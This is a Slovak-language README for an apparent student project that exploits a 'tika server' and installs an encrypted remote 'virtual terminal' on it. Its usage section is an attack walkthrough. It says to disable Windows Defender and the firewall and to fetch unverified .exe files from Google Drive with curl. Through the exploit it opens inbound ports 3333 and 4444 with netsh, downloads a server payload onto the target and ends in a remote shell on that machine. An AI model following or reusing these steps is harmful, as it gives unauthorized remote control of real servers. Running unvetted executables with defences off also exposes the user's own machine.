# IC1-projekt

## Obsah repozitara
V repozitary su 3 zlozky :
### build
Tu sa nachadza iba subor `build.bat` ktory zkompiluje vsetky zdrojaky do 4 exe suborov :
1. **client_side** - cast virtualneho terminalu ktora sa spusta na klientovy (utocnik) ked uz boli otvorene porty pomocou exploitu.
2. **server_side** - cast virtualneho terminalu ktora sa spusta na servery ma 2 argumenty *[ip_addr_ca, ip_addr_client]*. 
3. **exploit** - subor ktory utoci na tika server, spusta sa na klientovy.
4. **CertificateAuthority** - Certifikacna autorita ktora sluzy ako tretia strana pri sifrovanej komunikacii medzi sererom a klientom.
### exploit 
V tejto zlozke sa nachadza subor `commands_list.txt` v ktorom su napisane 2 prikazy na otvorenie portov na serveri pre komunikaciu z CA (4444) a klientom (3333).
V subore `exploit.py` su zdrojove kody pre exploit.exe
### virtual_cmd
V tejto zlozke su zdrojove kody pre sifrovanu komunikaciu v zlozke `communication` a subory su zdrojove kody pre client_side.exe a server_side.exe respektivne.

## Ako spustit exploit 
- pred startom je potrebne vypnut windows defender a windows firewall
- ako prove si musime stiahnut potrebne subory, v subore `commands_list.txt` sa nachadazju linky na 3. potrebne .exe subory 
    -   `curl -L -o exploit.exe "https://drive.google.com/uc?export=download&id=1JLoM4mb9r6DXaW-wq8X2vu4hISk3cOiE"`
    -   `curl -L -o client_side.exe "https://drive.google.com/uc?export=download&id=1YWW_w4_0Yah4jvRlaDiPJfQ6so3_kt4N"`
    -   `curl -L -o CertificateAuthority.exe "https://drive.google.com/uc?export=download&id=1RfyO5BhZNs_CN3Slr-IC_vFiHayp_JUs"`
- exploit.exe je potrebne spustit na utocnikovej strane v cmd z pravami administratora
- po zadani IP adresy je mozne zadavat prikazy zo suboru commands_list a to prve dve : 
    -   `netsh advfirewall firewall add rule name="Allow port 3333" dir=in action=allow protocol=TCP localport=3333`
    -   `netsh advfirewall firewall add rule name="Allow port 4444" dir=in action=allow protocol=TCP localport=4444`
- dalej je potrebne spustit CertificateAuthority.exe v novom terminaly z administrativnimy pravami
- v terminaly kde je spusteny exploit.exe je potrebne stiahnut subor server_side.exe
    -   `curl -L -o server_side.exe "https://drive.google.com/uc?export=download&id=1MWQaEGF5sdziP5qQR7zLXzuNJT_CAgcj"` 
- tento subor nasledovne stiahneme z prikazom server_side.exe *[ip_adresa_klienta]* *[ip_adresa_klienta]*
- potom spustime na klientovy subor client_side.exe a zvolime ip adresu CA *(localhost v tomto pripade)* a serveru
- ak vsetko prebehlo ako malu virtualne cmd je inicializovane a je mozne sa pohybovat v adresarovej strukture servera a zadavat prikazy


